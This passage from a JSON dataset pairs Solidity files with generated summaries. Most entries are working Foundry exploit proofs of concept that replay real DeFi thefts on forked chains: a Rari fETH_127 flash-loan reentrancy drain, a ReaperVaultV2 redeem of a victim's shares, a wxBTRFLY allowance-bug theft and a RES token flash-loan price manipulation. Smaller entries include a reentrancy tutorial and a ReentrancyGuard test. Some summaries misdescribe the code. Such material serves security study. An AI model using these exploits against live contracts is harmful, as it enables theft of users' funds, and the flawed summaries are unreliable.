        "code": "// SPDX-License-Identifier: UNLICENSED\n// !! THIS FILE WAS AUTOGENERATED BY abi-to-sol v0.5.3. SEE SOURCE BELOW. !!\npragma solidity >=0.7.0 <0.9.0;\n\nimport \"forge-std/Test.sol\";\nimport \"./interface.sol\";\n\ncontract ContractTest is DSTest {\n  IERC20 usdc = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);\n\n  ICEtherDelegate fETH_127 =\n    ICEtherDelegate(payable(0x26267e41CeCa7C8E0f143554Af707336f27Fa051));\n\n  ICErc20Delegate fusdc_127 =\n    ICErc20Delegate(0xEbE0d1cb6A0b8569929e062d67bfbC07608f0A47);\n\n  IUnitroller rari_Comptroller =\n    IUnitroller(0x3f2D1BC6D02522dbcdb216b2e75eDDdAFE04B16F);\n\n  IBalancerVault vault =\n    IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);\n  CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);\n\n  function setUp() public {\n    cheats.createSelectFork(\"mainnet\", 14684813); //fork mainnet at 14684813\n  }\n\n  function testExploit() public {\n    emit log_named_uint(\n      \"ETH Balance of fETH_127 before borrowing\",\n      address(fETH_127).balance / 1e18\n    );\n\n    payable(address(0)).transfer(address(this).balance);\n\n    emit log_named_uint(\n      \"ETH Balance after sending to blackHole\",\n      address(this).balance\n    );\n\n    address[] memory tokens = new address[](1);\n\n    tokens[0] = address(usdc);\n\n    uint256[] memory amounts = new uint256[](1);\n\n    amounts[0] = 150000000 * 10**6;\n\n    vault.flashLoan(address(this), tokens, amounts, \"\");\n  }\n\n  function receiveFlashLoan(\n    IERC20[] memory tokens,\n    uint256[] memory amounts,\n    uint256[] memory feeAmounts,\n    bytes memory userData\n  ) external {\n    tokens;\n    amounts;\n    feeAmounts;\n    userData;\n\n    uint256 usdc_balance = usdc.balanceOf(address(this));\n    emit log_named_uint(\"Borrow USDC from balancer\", usdc_balance);\n    usdc.approve(address(fusdc_127), type(uint256).max);\n\n    fusdc_127.accrueInterest();\n\n    fusdc_127.mint(15000000000000);\n\n    uint256 fETH_Balance = fETH_127.balanceOf(address(this));\n\n    emit log_named_uint(\"fETH Balance after minting\", fETH_Balance);\n\n    usdc_balance = usdc.balanceOf(address(this));\n\n    emit log_named_uint(\"USDC balance after minting\", usdc_balance);\n\n    address[] memory ctokens = new address[](1);\n\n    ctokens[0] = address(fusdc_127);\n\n    rari_Comptroller.enterMarkets(ctokens);\n\n    fETH_127.borrow(1977 ether);\n\n    emit log_named_uint(\n      \"ETH Balance of fETH_127_Pool after borrowing\",\n      address(fETH_127).balance / 1e18\n    );\n\n    emit log_named_uint(\n      \"ETH Balance of me after borrowing\",\n      address(this).balance / 1e18\n    );\n\n    usdc_balance = usdc.balanceOf(address(this));\n\n    fusdc_127.approve(address(fusdc_127), type(uint256).max);\n\n    fusdc_127.redeemUnderlying(15000000000000);\n\n    usdc_balance = usdc.balanceOf(address(this));\n\n    emit log_named_uint(\"USDC balance after borrowing\", usdc_balance);\n\n    usdc.transfer(address(vault), usdc_balance);\n\n    usdc_balance = usdc.balanceOf(address(this));\n\n    emit log_named_uint(\"USDC balance after repayying\", usdc_balance);\n  }\n\n  receive() external payable {\n    rari_Comptroller.exitMarket(address(fusdc_127));\n  }\n}\n",
        "summary": "This is a Solidity smart contract that tests an exploit on a set of DeFi protocols. The contract defines a series of functions that interact with various DeFi protocols such as Balancer, Compound and Rari. The main function `testExploit()` calls the Balancer Vault to borrow a large amount of USDC, mints some fUSDC from Compound with the borrowed USDC, and then borrows a large amount of ETH from fETH_127 by using the fUSDC as collateral. The contract also includes debugging code and logging statements that print out relevant balances. The purpose of this contract is to demonstrate the potential for attacks on DeFi protocols and to encourage developers to improve the security of their protocols.",
        "id": "8225f212-091f-4380-9ca1-50ba6981a53c"
    },
    {
        "code": "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.10;\n\nimport \"forge-std/Test.sol\";\nimport \"./interface.sol\";\n\n// @KeyInfo - Total Lost : ~1.7M US$\n// Attacker : 0x5636e55e4a72299a0f194c001841e2ce75bb527a (ReaperFarm Exploiter 1 - who trigger the exploit)\n// Attacker : 0x2c177d20b1b1d68cc85d3215904a7bb6629ca954 (ReaperFarm Exploiter 2 - who receive the fund)\n// AttackContract : 0x8162a5e187128565ace634e76fdd083cb04d0145\n// VulnerableContract : https://ftmscan.com/address/0xcdA5deA176F2dF95082f4daDb96255Bdb2bc7C7D#code#F1#L324 (rfUSDC)\n\n// @Info\n// Example Tx in this reproduce : https://ftmscan.com/tx/0xc92ls9f3b9312ff26be0adb1c3ff832dbdafdcbcaad33d002744effd515e53c9d5\n// Owner 1 : 0x59cb9f088806e511157a6c92b293e5574531022a\n// Owner 2 : 0xc010adc2c28a66fbb2107993bf6ede264eca8e54\n// Owner 3 : 0x37eedb7ac276bd6c894e81b8937b0b0bab154e22\n// Owner 4 : 0x8034aaff3980487a49ca69341d444fcc000088af\n// Owner 5 : 0x9e6affa8a14174ca4e931a2d6b7056c41b9beeb6\n\n// @Analysis\n// Offical post-mortem : https://twitter.com/Reaper_Farm/status/1554500909740302337\n// Beosin : https://twitter.com/BeosinAlert/status/1554476940593340421\n\ncontract Attacker is Test {\n    CheatCodes constant cheat = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);\n    IReaperVaultV2 constant ReaperVault = IReaperVaultV2(0xcdA5deA176F2dF95082f4daDb96255Bdb2bc7C7D);\n    IERC20 constant USDC = IERC20(0x04068DA6C83AFCFA0e13ba15A6696662335D5B75);\n\n    function setUp() public {\n        console.log(\"This is a simple PoC that shows how attacker abuse the ReaperVaultV2 contract\");\n        cheat.createSelectFork(\"fantom\", 44045899);\n        cheat.label(address(ReaperVault), \"ReaperVault\");\n        cheat.label(address(USDC), \"USDC\");\n    }\n\n    function testExploit() public {\n        address victim = 0x59cb9F088806E511157A6c92B293E5574531022A;\n        emit log_named_decimal_uint(\"Victim ReaperUSDCVault balance\", ReaperVault.balanceOf(victim), 6);\n        emit log_named_decimal_uint(\"Attacker USDC balance\", USDC.balanceOf(address(this)), 6);\n\n        console.log(\"Exploit...\");\n        uint256 victim_bal = ReaperVault.balanceOf(victim);\n        ReaperVault.redeem(victim_bal, address(this), victim);\n\n        emit log_named_decimal_uint(\"Victim ReaperUSDCVault balance\", ReaperVault.balanceOf(victim), 6);\n        emit log_named_decimal_uint(\"Attacker USDC balance\", USDC.balanceOf(address(this)), 6);\n\n    }\n}\n\ninterface IReaperVaultV2 {\n    function balanceOf(address owner) external view returns (uint256);\n    function redeem(uint256 shares, address receiver, address owner) external returns (uint256 assets);\n}",
        "summary": "This code defines a solidity contract called \"Attacker\" that interacts with two other contracts called \"CheatCodes\" and \"IReaperVaultV2\", as well as a token contract called \"IERC20\". The Attacker contract contains two functions, \"setUp\" and \"testExploit\". The setUp function logs a message to the console and initializes instances of the other contracts that it interacts with. The testExploit function calls the \"redeem\" function of the ReaperVault contract, passing in parameters obtained from its interaction with the same contract, which has the effect of transferring funds from a victim account to the attacker's account. The purpose of this code appears to be to demonstrate how an attacker can exploit a vulnerability in the ReaperVaultV2 contract to steal funds from unsuspecting users.",
        "id": "66f192ef-6eb6-479f-8421-03dd27986eb7"
    },
    {
        "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\npragma abicoder v2;\nimport \"./RestStorage.sol\";\nimport './OrderStorage.sol';\nimport './UserStorage.sol';\nimport './RecordStorage.sol';\nimport './AppealStorage.sol';\n\ninterface RecordInterface {\n    function getErcBalance(string memory _coinType, address _addr) external returns(uint);\n    function getAvailableTotal(address _addr, string memory _coinType) external returns(uint);\n    function getFrozenTotal(address _addr, string memory _coinType) external returns(uint);\n    function addAvailableTotal(address _addr, string memory _coinType, uint remainHoldCoin) external;\n    function subAvaAppeal(address _from, address _to, AppealStorage.Appeal memory _al, uint _amt, uint _type, uint _self) external;\n    function subWitnessAvailable(address _addr) external;\n    function setERC20Address(string memory _coinType) external returns(TokenTransfer);\n    function subFrozenTotal(uint _orderNo, address _addr) external;\n    function addRecord(address _addr, string memory _tradeHash, string memory _coinType, uint _hostCount, uint _hostStatus, uint _hostType, uint _hostDirection) external;\n    function getAppealFee() external view returns(uint);\n    function getAppealFeeFinal() external view returns(uint);\n    function getWitnessHandleReward() external view returns(uint);\n    function getObserverHandleReward() external view returns(uint);\n    function getWitnessHandleCredit() external view returns(uint);\n    function getObserverHandleCredit() external view returns(uint); \n    function getSubWitCredit() external view returns(uint);\n    function getOpenTrade() external view returns(bool);\n    function getTradeCredit() external view returns(uint);\n    function getSubTCredit() external view returns(uint);\n    function getSubWitFee() external view returns(uint);\n}\ninterface RestInterface {\n    function searchRest(uint _restNo) external returns(RestStorage.Rest memory rest);\n    function getRestFrozenTotal(address _addr, uint _restNo) external returns(uint);\n    function updateRestFinishCount(uint _restNo, uint _coinCount) external returns(uint);\n    function addRestRemainCount(uint _restNo, uint _remainCount) external returns(uint);\n}\ninterface OrderInterface {\n    function searchOrder(uint _orderNo) external returns(OrderStorage.Order memory order);\n}\ninterface UserInterface {\n    function searchUser(address _addr) external view returns(UserStorage.User memory user);\n    function searchWitnessList(uint _userFlag) external returns(UserStorage.User[] memory userList);\n    function updateTradeStats(address _addr, UserStorage.TradeStats memory _tradeStats, uint _credit) external;\n    function updateMorgageStats(address _addr, UserStorage.MorgageStats memory _morgageStats) external;\n    function updateUserRole(address _addr, uint _userFlag) external;\n}\ninterface AppealInterface {\n    function searchAppeal(uint _o) external view returns(AppealStorage.Appeal memory appeal);\n}\n",
        "summary": "The code defines several interfaces that define functions for interacting with various storage contracts. These interfaces are used in other parts of the code to access and manipulate data stored in those contracts. The code does not contain any actual functionality, only the definition of interfaces.",
        "id": "49a317ae-61ce-4e1e-b1ce-cff2542b7243"
    },
    {
        "code": "// SPDX-License-Identifier: UNLICENSED\n\npragma solidity ^0.8.10;\n\nimport \"forge-std/Test.sol\";\nimport \"./interface.sol\";\n\n/*\nRedacted Cartel Custom Approval Logic Exploit PoC\n\nThe vulnerability would have allowed a malicious attacker to assign a user\u2019s allowance to themselves, enabling the attacker to steal that user\u2019s funds.\n\na faulty implementation of standard transferFrom() ERC-20 function in wxBTRFLY token.\n\n\n*/\ncontract RedactedCartelExploit is DSTest {\n    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);\n    IRedactedCartelSafeERC20 wxBTRFLY = IRedactedCartelSafeERC20(0x186E55C0BebD2f69348d94C4A27556d93C5Bd36C);\n\n    address Alice = 0x9ee1873ba8383B1D4ac459aBd3c9C006Eaa8800A;\n    address AliceContract = 0x0f41d34B301E24E549b7445B3f620178bff331be;\n    address Bob = 0x78186702Bd66905845B469E3b76d4FD63F8722d4;\n    address owner = 0x20B92862dcb9976E0AA11fAE766343B7317aB349; //owner of wxBTRFLY token\n\n    function setUp() public {\n        cheats.createSelectFork(\"mainnet\", 13908185); //13908185 \n\n\n        // cheat.label(address(Alice), \"Alice\");\n        // cheat.label(address(AliceContract), \"AliceContract\");\n        // cheat.label(address(Bob), \"Bob\");\n        // cheat.label(address(owner), \"wxBTRFLYOwner\");\n\n    }\n\n    function testExploit() public {\n\n\n        //quick hack to bypass the \"onlyAuthorisedOperators\" modifier\n        cheats.prank(owner);\n        wxBTRFLY.unFreezeToken();\n\n        console.log(\"Before the Exploit !\");\n        console.log(\"Alice wxBTRFLY Token Balance: \", wxBTRFLY.balanceOf(Alice));\n        console.log(\"Bob wxBTRFLY Token Balance: \", wxBTRFLY.balanceOf(Bob));\n        console.log(\"--------------------------------------------------\");\n\n        // Step 1: Alice approves an address to spend wxBTRFLY Token on her behalf\n        cheats.prank(Alice);\n        wxBTRFLY.approve(AliceContract, 89011248549237373700); // wxBTRFLY.balanceOf(Alice)\n        console.log(\"wxBTRFLY Allowance of Alice->AliceContract : \", wxBTRFLY.allowance(Alice, AliceContract));\n        console.log(\"wxBTRFLY Allowance of Alice->Bob(Before transferFrom): \", wxBTRFLY.allowance(Alice, Bob));\n\n\n        /*\n            Custom vulnerable transferFrom function of wxBTRFLY token\n\n             function transferFrom(address sender, address recipient, uint256 amount) public virtual override onlyAuthorisedOperators returns (bool) {\n                _transfer(sender, recipient, amount);\n                _approve(sender, msg.sender, allowance(sender, recipient ).sub(amount, \"ERC20: transfer amount exceeds allowance\"));\n                return true;\n            }\n        */\n\n        // Step 2: Bob calls wxBTRFLY.transferFrom(Alice, aliceContract, 0),\n        // No transfer happens, but due to the allowance bug, Bob gets an allowance for Alice\u2019s money\n        cheats.prank(Bob);\n        //_approve(Alice, Bob, allowance(Alice, AliceContract ).sub(0)\n        wxBTRFLY.transferFrom(Alice, AliceContract, 0);\n        console.log(\"wxBTRFLY Allowance of Alice->Bob(After transferFrom): \", wxBTRFLY.allowance(Alice, Bob));\n\n        //post-hack\n        cheats.prank(Bob);\n        wxBTRFLY.transferFrom(Alice, Bob, 89011248549237373700); // wxBTRFLY.balanceOf(Alice)\n        \n        console.log(\"--------------------------------------------------\");\n        console.log(\"After the Exploit !\");\n        console.log(\"Alice wxBTRFLY Token Balance: \", wxBTRFLY.balanceOf(Alice));\n        console.log(\"Bob wxBTRFLY Token Balance: \", wxBTRFLY.balanceOf(Bob));\n    }\n}",
        "summary": "This code is a contract called `RedactedCartelExploit` that demonstrates an exploit of a specific ERC-20 token called `wxBTRFLY`. The exploit is related to a flaw in the `transferFrom()` function that allows a malicious attacker to assign an unsuspecting user's allowance to themselves and steal their funds. The `RedactedCartelExploit` contract imports the `Test.sol` and `interface.sol` contracts and defines the `CheatCodes` and `IRedactedCartelSafeERC20` variables that interact with the `wxBTRFLY` token. The contract also defines some addresses for Alice, AliceContract, Bob, and the owner of the `wxBTRFLY` token. The `setUp()` function sets up a fork of the mainnet and, if uncommented, labels some addresses for better logging. The `testExploit()` function is where the exploit happens. There are several steps taken to exploit the allowance bug, including Alice approving the contract to spend the `wxBTRFLY` token on her behalf, Bob calling the `transferFrom()` function with a zero amount, and then Bob transferring the full amount of Alice's tokens to himself. Finally, the function logs the before and after token balances of Alice and Bob to show the exploit worked.",
        "id": "ef0830bf-de26-4b73-86a0-ef37e3ff1b28"
    },
    {
        "code": "// SPDX-License-Identifier: MIT\n// by 0xAA\npragma solidity ^0.8.4;\n\ncontract Bank {\n    mapping (address => uint256) public balanceOf;    // \u4f59\u989dmapping\n\n    // \u5b58\u5165ether\uff0c\u5e76\u66f4\u65b0\u4f59\u989d\n    function deposit() external payable {\n        balanceOf[msg.sender] += msg.value;\n    }\n\n    // \u63d0\u53d6msg.sender\u7684\u5168\u90e8ether\n    function withdraw() external {\n        // \u83b7\u53d6\u4f59\u989d\n        uint256 balance = balanceOf[msg.sender];\n        require(balance > 0, \"Insufficient balance\");\n        // \u8f6c\u8d26 ether !!! \u53ef\u80fd\u6fc0\u6d3b\u6076\u610f\u5408\u7ea6\u7684fallback/receive\u51fd\u6570\uff0c\u6709\u91cd\u5165\u98ce\u9669\uff01\n        (bool success, ) = msg.sender.call{value: balance}(\"\");\n        require(success, \"Failed to send Ether\");\n        // \u66f4\u65b0\u4f59\u989d\n        balanceOf[msg.sender] = 0;\n    }\n\n    // \u83b7\u53d6\u94f6\u884c\u5408\u7ea6\u7684\u4f59\u989d\n    function getBalance() external view returns (uint256) {\n        return address(this).balance;\n    }\n}\n\ncontract Attack {\n    Bank public bank; // Bank\u5408\u7ea6\u5730\u5740\n\n    // \u521d\u59cb\u5316Bank\u5408\u7ea6\u5730\u5740\n    constructor(Bank _bank) {\n        bank = _bank;\n    }\n    \n    // \u56de\u8c03\u51fd\u6570\uff0c\u7528\u4e8e\u91cd\u5165\u653b\u51fbBank\u5408\u7ea6\uff0c\u53cd\u590d\u7684\u8c03\u7528\u76ee\u6807\u7684withdraw\u51fd\u6570\n    receive() external payable {\n        if (address(bank).balance >= 1 ether) {\n            bank.withdraw();\n        }\n    }\n\n    // \u653b\u51fb\u51fd\u6570\uff0c\u8c03\u7528\u65f6 msg.value \u8bbe\u4e3a 1 ether\n    function attack() external payable {\n        require(msg.value == 1 ether, \"Require 1 Ether to attack\");\n        bank.deposit{value: 1 ether}();\n        bank.withdraw();\n    }\n\n    // \u83b7\u53d6\u672c\u5408\u7ea6\u7684\u4f59\u989d\n    function getBalance() external view returns (uint256) {\n        return address(this).balance;\n    }\n}\n\n// \u5229\u7528 \u68c0\u67e5-\u5f71\u54cd-\u4ea4\u4e92\u6a21\u5f0f\uff08checks-effect-interaction\uff09\u9632\u6b62\u91cd\u5165\u653b\u51fb\ncontract GoodBank {\n    mapping (address => uint256) public balanceOf;\n\n    function deposit() external payable {\n        balanceOf[msg.sender] += msg.value;\n    }\n\n    function withdraw() external {\n        uint256 balance = balanceOf[msg.sender];\n        require(balance > 0, \"Insufficient balance\");\n        // \u68c0\u67e5-\u6548\u679c-\u4ea4\u4e92\u6a21\u5f0f\uff08checks-effect-interaction\uff09\uff1a\u5148\u66f4\u65b0\u4f59\u989d\u53d8\u5316\uff0c\u518d\u53d1\u9001ETH\n        // \u91cd\u5165\u653b\u51fb\u7684\u65f6\u5019\uff0cbalanceOf[msg.sender]\u5df2\u7ecf\u88ab\u66f4\u65b0\u4e3a0\u4e86\uff0c\u4e0d\u80fd\u901a\u8fc7\u4e0a\u9762\u7684\u68c0\u67e5\u3002\n        balanceOf[msg.sender] = 0;\n        (bool success, ) = msg.sender.call{value: balance}(\"\");\n        require(success, \"Failed to send Ether\");\n    }\n\n    function getBalance() external view returns (uint256) {\n        return address(this).balance;\n    }\n}\n\n// \u5229\u7528 \u91cd\u5165\u9501 \u9632\u6b62\u91cd\u5165\u653b\u51fb\ncontract ProtectedBank {\n    mapping (address => uint256) public balanceOf;\n    uint256 private _status; // \u91cd\u5165\u9501\n\n    // \u91cd\u5165\u9501\n    modifier nonReentrant() {\n        // \u5728\u7b2c\u4e00\u6b21\u8c03\u7528 nonReentrant \u65f6\uff0c_status \u5c06\u662f 0\n        require(_status == 0, \"ReentrancyGuard: reentrant call\");\n        // \u5728\u6b64\u4e4b\u540e\u5bf9 nonReentrant \u7684\u4efb\u4f55\u8c03\u7528\u90fd\u5c06\u5931\u8d25\n        _status = 1;\n        _;\n        // \u8c03\u7528\u7ed3\u675f\uff0c\u5c06 _status \u6062\u590d\u4e3a0\n        _status = 0;\n    }\n\n\n    function deposit() external payable {\n        balanceOf[msg.sender] += msg.value;\n    }\n\n    // \u7528\u91cd\u5165\u9501\u4fdd\u62a4\u6709\u6f0f\u6d1e\u7684\u51fd\u6570\n    function withdraw() external nonReentrant{\n        uint256 balance = balanceOf[msg.sender];\n        require(balance > 0, \"Insufficient balance\");\n\n        (bool success, ) = msg.sender.call{value: balance}(\"\");\n        require(success, \"Failed to send Ether\");\n\n        balanceOf[msg.sender] = 0;\n    }\n\n    function getBalance() external view returns (uint256) {\n        return address(this).balance;\n    }\n}\n\n",
        "summary": "This is a Solidity smart contract that implements a simple bank. It allows users to deposit and withdraw Ether (cryptocurrency) from their account. The contract includes three variations, each with a different approach to preventing reentrancy attacks. The first variation is vulnerable to reentrancy attacks, while the second and third variations attempt to mitigate this risk. The third variation uses a \"reentrancy guard\" to prevent reentrancy attacks.",
        "id": "63eaee55-958c-4479-93e0-15c51cedbd28"
    },
    {
        "code": "// SPDX-License-Identifier: AGPL-3.0-only\npragma solidity >=0.8.0;\n\n/// @notice Gas optimized reentrancy protection for smart contracts.\n/// @author Solmate (https://github.com/transmissions11/solmate/blob/main/src/utils/ReentrancyGuard.sol)\n/// @author Modified from OpenZeppelin (https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/security/ReentrancyGuard.sol)\nabstract contract ReentrancyGuard {\n    uint256 private locked = 1;\n\n    modifier nonReentrant() virtual {\n        require(locked == 1, \"REENTRANCY\");\n\n        locked = 2;\n\n        _;\n\n        locked = 1;\n    }\n}\n",
        "summary": "This is a smart contract implementing gas-optimized reentrancy protection mechanism. It defines an abstract contract named `ReentrancyGuard` with a `modifier` named `nonReentrant`. The modifier ensures that a function can only be called once at a time by checking a private `locked` variable. If the `locked` variable equals 1, then the function can be executed. Otherwise, a `REENTRANCY` error message is thrown. The `locked` variable is set to 2 before executing the function and then reset to 1 after the function completes. The license for the code is also specified in the contract.",
        "id": "dea32ff9-5a27-468e-b2a6-e3b694d090de"
    },
    {
        "code": "// SPDX-License-Identifier: AGPL-3.0-only\npragma solidity 0.8.15;\n\nimport {DSTestPlus} from \"./utils/DSTestPlus.sol\";\n\nimport {ReentrancyGuard} from \"../utils/ReentrancyGuard.sol\";\n\ncontract RiskyContract is ReentrancyGuard {\n    uint256 public enterTimes;\n\n    function unprotectedCall() public {\n        enterTimes++;\n\n        if (enterTimes > 1) return;\n\n        this.protectedCall();\n    }\n\n    function protectedCall() public nonReentrant {\n        enterTimes++;\n\n        if (enterTimes > 1) return;\n\n        this.protectedCall();\n    }\n\n    function overprotectedCall() public nonReentrant {}\n}\n\ncontract ReentrancyGuardTest is DSTestPlus {\n    RiskyContract riskyContract;\n\n    function setUp() public {\n        riskyContract = new RiskyContract();\n    }\n\n    function invariantReentrancyStatusAlways1() public {\n        assertEq(uint256(hevm.load(address(riskyContract), 0)), 1);\n    }\n\n    function testFailUnprotectedCall() public {\n        riskyContract.unprotectedCall();\n\n        assertEq(riskyContract.enterTimes(), 1);\n    }\n\n    function testProtectedCall() public {\n        try riskyContract.protectedCall() {\n            fail(\"Reentrancy Guard Failed To Stop Attacker\");\n        } catch {}\n    }\n\n    function testNoReentrancy() public {\n        riskyContract.overprotectedCall();\n    }\n}\n",
        "summary": "This code contains two Solidity contracts, \"RiskyContract\" and \"ReentrancyGuardTest\". \n\nThe RiskyContract contract has three functions: unprotectedCall, protectedCall, and overprotectedCall. The enterTimes state variable is incremented each time unprotectedCall() or protectedCall() is called. unprotectedCall() can be called multiple times without restriction, invoking protectedCall() if it is the first call. However, protectedCall() uses the \"nonReentrant\" modifier from the ReentrancyGuard contract, which prevents reentrancy (multiple calls to the same function before the original call finishes). If protectedCall() is called twice or more, it will exit before it can be called again. overprotectedCall() does nothing but uses the nonReentrant modifier.\n\nThe ReentrancyGuardTest contract contains several test functions that simulate different scenarios. \"setUp()\" creates a new instance of RiskyContract. \"invariantReentrancyStatusAlways1()\" checks that enterTimes only ever equals 1 when RiskyContract is called. \"testFailUnprotectedCall()\" checks whether enterTimes is incremented correctly when unprotectedCall() is called. \"testProtectedCall()\" verifies that the nonReentrant modifier successfully prevents a reentrant attack on the protectedCall() function. \"testNoReentrancy()\" ensures that overprotectedCall() cannot be called more than once.",
        "id": "e534cd21-7ad5-40f3-9ee7-4bcb71cea137"
    },
    {
        "code": "pragma solidity ^0.8.10;\n\nimport \"forge-std/Test.sol\";\nimport \"./interface.sol\";\n\ninterface IRES is IERC20{\n    function thisAToB() external;\n}\n\n// @Analysis\n// https://twitter.com/BlockSecTeam/status/1578041521273962496\n// @Contract address\n// https://bscscan.com/address/0xeccd8b08ac3b587b7175d40fb9c60a20990f8d21#code\n\ncontract ReceiveToken{\n    constructor(){\n        IRES RES = IRES(0xecCD8B08Ac3B587B7175D40Fb9C60a20990F8D21);\n        IERC20 ALL = IERC20(0x04C0f31C0f59496cf195d2d7F1dA908152722DE7);\n        RES.approve(msg.sender, type(uint).max);\n        ALL.approve(msg.sender, type(uint).max);\n        selfdestruct(payable(msg.sender));\n    }\n    \n}\n\ncontract ContractTest is DSTest{\n    IERC20 USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);\n    IRES RES = IRES(0xecCD8B08Ac3B587B7175D40Fb9C60a20990F8D21);\n    IERC20 ALL = IERC20(0x04C0f31C0f59496cf195d2d7F1dA908152722DE7);\n    IERC20 WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);\n    Uni_Router_V2 Router = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);\n    Uni_Pair_V2 RESPair = Uni_Pair_V2(0x05ba2c512788bd95cd6D61D3109c53a14b01c82A);\n    Uni_Pair_V2 ALLPair = Uni_Pair_V2(0x1B214e38C5e861c56e12a69b6BAA0B45eFe5C8Eb);\n    address dodo = 0xD7B7218D778338Ea05f5Ecce82f86D365E25dBCE;\n    address dodo2 = 0x9ad32e3054268B849b84a8dBcC7c8f7c52E4e69A;\n    uint amount;\n    uint amount2;\n    address add;\n\n    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);\n\n    function setUp() public {\n        cheats.createSelectFork(\"bsc\", 21948016);\n    }\n\n    function testExploit() public payable{\n\n        emit log_named_decimal_uint(\n            \"[Start] Attacker USDT balance before exploit\",\n            USDT.balanceOf(address(this)),\n            18\n        );\n        // use mint wbnb to mock flashLoan\n        address(WBNB).call{value: 30000 ether}(\"\");\n        WBNBToUSDT();\n        uint USDTBefore = USDT.balanceOf(address(this));\n        emit log_named_decimal_uint(\n            \"[Start] exchange USDT balance before exploit\",\n            USDT.balanceOf(address(this)),\n            18\n        );\n        amount = USDT.balanceOf(dodo);\n        amount2 = USDT.balanceOf(dodo2);\n        USDT.approve(address(Router), type(uint).max);\n        RES.approve(address(Router), type(uint).max);\n        ALL.approve(address(Router), type(uint).max);\n        bytes memory bytecode = type(ReceiveToken).creationCode;\n        address _add;\n        assembly{\n            _add := create2(0, add(bytecode, 32), mload(bytecode), 0)\n        }\n        add = _add;\n        DVM(dodo2).flashLoan(0, amount2, address(this), new bytes(1));\n\n        uint USDTAfter = USDT.balanceOf(address(this));\n\n        emit log_named_decimal_uint(\n            \"[End] RESPair USDT balance after exploit\",\n            USDT.balanceOf(address(RESPair)),\n            18\n        );\n\n        emit log_named_decimal_uint(\n            \"[End] ALLPair USDT balance after exploit\",\n            USDT.balanceOf(address(ALLPair)),\n            18\n        );\n\n        emit log_named_decimal_uint(\n            \"[End] Attacker USDT balance after exploit\",\n            USDTAfter - USDTBefore,\n            18\n        );\n\n    }\n\n    function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) public{\n        if(msg.sender == dodo2){\n            DVM(dodo).flashLoan(0, amount, address(this), new bytes(1));\n            USDT.balanceOf(address(this));\n            USDT.transfer(dodo2, amount2);\n        }\n        else{\n        // get RES\n        uint amountBuy = USDT.balanceOf(address(this)) / 4;\n        buyRES(amountBuy);\n        buyRES(amountBuy);\n        buyRES(amountBuy);\n        buyRES(amountBuy);\n        // Burn RES in LP \n        RES.thisAToB();\n        // Sell RES , ALL\n        sellRES();\n        sellALL();\n        USDT.balanceOf(address(this));\n        USDT.transfer(address(dodo), amount);\n        }\n    }\n\n    function WBNBToUSDT() internal{\n        WBNB.approve(address(Router), type(uint).max);\n        address [] memory path = new address[](2);\n        path[0] = address(WBNB);\n        path[1] = address(USDT);\n        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(\n            WBNB.balanceOf(address(this)),\n            0,\n            path,\n            address(this),\n            block.timestamp\n        );\n    }\n\n    function buyRES(uint amountBuy) internal{\n        address [] memory path = new address[](2);\n        path[0] = address(USDT);\n        path[1] = address(RES);\n        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(\n            amountBuy,\n            0,\n            path,\n            // pass isContract(), the exploiter use EOA address in another contract, i guess he approve the contract in advance\n            add,\n            block.timestamp\n        );\n    }\n\n    function sellRES() internal{\n        (uint reserve0, uint reserve1, ) = RESPair.getReserves(); // USDT, RES\n        RES.transferFrom(add, address(RESPair), RES.balanceOf(add));\n        uint amountin = RES.balanceOf(address(RESPair)) - reserve1;\n        uint amountout = amountin * 9975 * reserve0 / (reserve1 * 10000 + amountin * 9975);\n        RESPair.swap(amountout, 0, address(this), \"\");\n    }\n\n    function sellALL() internal{\n        (uint reserve0, uint reserve1, ) = ALLPair.getReserves(); // ALL, USDT\n        ALL.transferFrom(add, address(ALLPair), ALL.balanceOf(add));\n        uint amountin = ALL.balanceOf(address(ALLPair)) - reserve0;\n        uint amountout = amountin * 9975 * reserve1 / (reserve0 * 10000 + amountin * 9975);\n        ALLPair.swap(0, amountout, address(this), \"\");\n        \n    }\n\n    receive() external payable{}\n\n}",
        "summary": "The code consists of two Solidity contracts. \n\nThe first contract, `ReceiveToken`, has a constructor function that initializes several contracts defined in the second contract. It also calls the selfdestruct function with the sender's address as an argument. \n\nThe second contract, `ContractTest`, is a DSTest contract with several functions. The `setUp()` function sets up a fork on the Binance Smart Chain. The `testExploit()` function is the main function and performs an exploit by using a flashLoan from the DODO exchange. The `DPPFlashLoanCall()` function is called by the DODO exchange and buys, sells, and transfers tokens. The `WBNBToUSDT()`, `buyRES()`, `sellRES()`, and `sellALL()` functions swap various tokens on the Uniswap V2 router. There are also several calls to logging functions to log data during the exploit.",
        "id": "6397fe2f-d644-410a-a93f-76fd4935eb3c"
    },
    {
